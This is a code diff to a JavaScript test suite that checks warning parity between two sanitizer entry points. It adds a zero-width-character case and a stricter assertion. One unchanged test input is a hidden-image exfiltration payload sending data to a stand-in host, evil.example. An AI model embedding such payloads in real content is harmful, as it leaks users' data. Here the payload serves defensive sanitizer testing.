@@ -48,6 +48,9 @@ const CASES = [
     `<div hidden><img src="https://evil.example/x?data=${BLOB}"></div>`,
   ],
   ["benign html", "hello <b>world</b>"],
+  // Layer 1 AND Layer 2 in one input, so the "every unfiltered warning is a
+  // Layer-1 line" check below is exercised rather than vacuous.
+  ["zero-width char inside spliced html", "a\u200b<!-- hi --> b"],
 ];
 
 // Warnings owned by Layers 2 and 3 — the ones both entry points produce. Layer
@@ -76,10 +79,12 @@ describe("Layer 2/3 warning parity between sanitize() and sanitizeText()", () =>
       );
       // Non-vacuity per case: a filter that stopped matching would make every
       // comparison [] === [] and the whole test pass while the prose diverged.
-      assert.equal(
-        rootWarnings.length,
-        root.warnings.filter((w) => !w.startsWith("Stripped")).length,
-        `${name}: a root warning was not recognized as a Layer-2/3 line — extend isLayer23`,
+      assert.deepEqual(
+        root.warnings.filter(
+          (w) => !isLayer23(w) && !w.startsWith("Stripped:"),
+        ),
+        [],
+        `${name}: a root warning is neither a Layer-1 nor a recognized Layer-2/3 line — extend isLayer23`,
       );
       if (rootWarnings.length > 0) withWarnings++;
     }
